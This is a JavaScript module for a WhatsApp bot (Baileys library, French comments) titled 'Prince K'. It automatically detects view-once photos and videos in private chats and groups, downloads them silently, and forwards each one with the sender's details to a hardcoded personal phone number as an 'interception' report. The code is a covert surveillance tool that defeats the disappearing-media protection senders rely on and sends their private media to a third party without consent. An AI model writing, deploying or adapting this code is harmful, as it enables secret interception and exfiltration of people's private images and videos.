const { downloadContentFromMessage } = require('@whiskeysockets/baileys');

const viewonce = async (client, msg) => {
    // 1. Détection automatique : vérifie si le message est une vue unique
    const isViewOnce = msg.mtype === 'viewOnceMessageV2' || msg.quoted?.mtype === 'viewOnceMessageV2';

    if (!isViewOnce) return; // Reste discret, ne fait rien si ce n'est pas une vue unique

    try {
        const target = msg.quoted ? msg.quoted : msg;
        const type = Object.keys(target.message)[0];
        const media = target.message[type];

        // 2. Téléchargement silencieux du média
        const stream = await downloadContentFromMessage(media, type === 'imageMessage' ? 'image' : 'video');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        // 3. Ton numéro personnel configuré
        const monNumero = '237659554606@s.whatsapp.net'; 

        // 4. Rapport d'interception Prince K
        const legende = `🕵️ *INTERCEPTION PRINCE K*\n\n` +
                        `👤 *Expéditeur:* @${msg.sender.split('@')[0]}\n` +
                        `📍 *Source:* ${msg.isGroup ? 'Groupe' : 'Discussion privée'}\n` +
                        `📄 *Type:* ${type === 'imageMessage' ? 'Photo' : 'Vidéo'}\n\n` +
                        `_Ceci est une copie discrète du média à vue unique._`;

        // 5. Envoi direct vers ton IB
        await client.sendMessage(monNumero, {
            [type === 'imageMessage' ? 'image' : 'video']: buffer,
            caption: legende,
            mentions: [msg.sender]
        });

        // Console log pour toi (invisible sur WhatsApp)
        console.log(`[Prince K] Succès : Média intercepté et envoyé au +237659554606`);

    } catch (error) {
        console.error("Erreur Prince K (ViewOnce):", error);
    }
};

module.exports = viewonce;
